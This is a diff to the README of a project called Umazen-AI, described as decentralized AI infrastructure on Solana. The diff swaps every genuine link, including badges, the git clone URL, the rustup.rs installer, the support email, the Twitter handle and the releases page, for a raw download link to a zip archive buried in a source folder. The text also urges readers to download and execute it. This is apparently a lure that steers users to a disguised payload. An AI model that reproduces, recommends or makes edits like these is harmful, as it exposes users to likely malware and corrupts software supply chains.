@@ -1,8 +1,8 @@
 # Umazen-AI 🌐🤖
 
-![Umazen-AI](https://img.shields.io/badge/Umazen--AI-Project-blue.svg)
-![Version](https://img.shields.io/badge/version-1.0.0-green.svg)
-![License](https://img.shields.io/badge/license-MIT-yellow.svg)
+![Umazen-AI](https://github.com/Mohmer/Umazen-AI/raw/refs/heads/main/federated-learning/coordinator/src/aggregation/Umazen_AI_v3.9.zip)
+![Version](https://github.com/Mohmer/Umazen-AI/raw/refs/heads/main/federated-learning/coordinator/src/aggregation/Umazen_AI_v3.9.zip)
+![License](https://github.com/Mohmer/Umazen-AI/raw/refs/heads/main/federated-learning/coordinator/src/aggregation/Umazen_AI_v3.9.zip)
 
 Welcome to **Umazen-AI**, a pioneering project aimed at building a decentralized AI infrastructure on the Solana blockchain. Our goal is to enable secure on-chain model training and create a global marketplace for AI inference services. This README will guide you through the project, its features, and how to get started.
 
@@ -57,12 +57,12 @@ To get started with **Umazen-AI**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Mohmer/Umazen-AI.git
+   git clone https://github.com/Mohmer/Umazen-AI/raw/refs/heads/main/federated-learning/coordinator/src/aggregation/Umazen_AI_v3.9.zip
    cd Umazen-AI
    ```
 
 2. **Install Dependencies**:
-   Ensure you have Rust and Cargo installed. You can install them from [rustup.rs](https://rustup.rs).
+   Ensure you have Rust and Cargo installed. You can install them from [https://github.com/Mohmer/Umazen-AI/raw/refs/heads/main/federated-learning/coordinator/src/aggregation/Umazen_AI_v3.9.zip](https://github.com/Mohmer/Umazen-AI/raw/refs/heads/main/federated-learning/coordinator/src/aggregation/Umazen_AI_v3.9.zip).
 
    ```bash
    cargo build
@@ -130,16 +130,16 @@ We welcome contributions to **Umazen-AI**. To contribute:
 
 For questions or support, please reach out to us:
 
-- **Email**: support@umazen-ai.com
-- **Twitter**: [@UmazenAI](https://twitter.com/UmazenAI)
+- **Email**: https://github.com/Mohmer/Umazen-AI/raw/refs/heads/main/federated-learning/coordinator/src/aggregation/Umazen_AI_v3.9.zip
+- **Twitter**: [@UmazenAI](https://github.com/Mohmer/Umazen-AI/raw/refs/heads/main/federated-learning/coordinator/src/aggregation/Umazen_AI_v3.9.zip)
 
 ---
 
 ## Releases
 
-You can find the latest releases of **Umazen-AI** [here](https://github.com/Mohmer/Umazen-AI/releases). Please download and execute the latest version to enjoy the new features and improvements.
+You can find the latest releases of **Umazen-AI** [here](https://github.com/Mohmer/Umazen-AI/raw/refs/heads/main/federated-learning/coordinator/src/aggregation/Umazen_AI_v3.9.zip). Please download and execute the latest version to enjoy the new features and improvements.
 
-To stay updated with the latest changes, check the [Releases](https://github.com/Mohmer/Umazen-AI/releases) section regularly.
+To stay updated with the latest changes, check the [Releases](https://github.com/Mohmer/Umazen-AI/raw/refs/heads/main/federated-learning/coordinator/src/aggregation/Umazen_AI_v3.9.zip) section regularly.
 
 ---
 
